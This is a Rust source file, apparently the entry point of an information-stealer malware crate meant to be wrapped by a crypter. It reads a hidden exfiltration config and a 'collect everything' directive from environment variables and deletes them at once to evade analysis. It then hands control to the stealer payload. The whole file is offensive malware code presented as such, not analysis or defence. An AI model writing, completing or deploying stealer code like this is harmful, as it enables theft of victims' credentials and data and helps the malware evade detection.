//! Binary entry point for the stealer payload. The crypter wraps the
//! compiled output of this crate. On startup the payload reads
//! SVC_EXFIL_CFG from the environment (set by the crypter stub before
//! it jumps here) and uses it as the live exfil config.
//!
//! Directive (tiers + persistence) comes from an env var too — set by
//! the stub or, in the standalone case, defaults to "collect everything".

fn main() {
    // Directive: optional. If SVC_DIRECTIVE is set (JSON), use it.
    // Otherwise default to all tiers, no persistence.
    let directive = std::env::var("SVC_DIRECTIVE").unwrap_or_else(|_| {
        r#"{"tiers":[],"persistence":[]}"#.to_string()
    });
    // scrub immediately
    std::env::remove_var("SVC_DIRECTIVE");

    svc_payload::run(directive.as_bytes());
}
